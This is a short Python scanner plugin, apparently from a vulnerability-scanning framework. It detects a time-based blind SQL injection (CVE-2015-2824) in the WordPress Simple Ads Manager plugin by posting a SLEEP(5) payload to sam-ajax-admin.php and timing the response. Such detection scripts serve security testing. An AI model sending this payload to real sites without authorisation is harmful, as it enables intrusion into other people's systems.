#!/usr/bin/env python
# -*- coding: utf-8 -*-
#by lkz
#wordpress simple-ads-manager sqlinjection (CVE-2015-2824)
#refer http://www.itas.vn/news/ITAS-Team-found-out-multiple-critical-vulnerabilities-in-Hakin9-IT-Security-Magazine-78.html?language=en
import re
import time
import math

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'
    url = arg + payload
    post_data1 = 'action=load_posts&cstr==1&sp=Post&spg=Page'
    post_data2 = 'action=load_posts&cstr==1%27)%20AND%20SLEEP(5)%20AND%20(%27WhYm%27=%27WhYm&sp=Post&spg=Page' 
    start_time1=time.time()
    code, head, res, _,_ = curl.curl('-d %s %s' % (post_data1,url))
    end_time1 = time.time()
    code, head, res, _,_ = curl.curl('-d %s %s' % (post_data2,url))
    if code == 200 and ((time.time()-end_time1)-(end_time1-start_time1))>5:
                    security_hole('wordpress simple-ads-manager sql injection')


if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress','http://www.example.com//')[1])